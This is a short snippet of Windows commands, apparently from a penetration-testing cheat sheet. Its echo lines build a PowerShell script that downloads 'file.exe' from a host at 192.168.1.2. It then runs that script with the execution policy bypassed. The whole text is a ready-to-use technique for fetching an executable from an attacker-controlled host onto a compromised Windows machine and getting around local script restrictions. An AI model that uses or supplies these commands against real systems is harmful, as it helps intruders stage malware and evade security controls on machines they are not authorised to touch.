echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.2/file.exe" >>wget.ps1
echo $file = "file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

#Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -NoLogo -NoInteractive -NoProfile -File wget.ps1
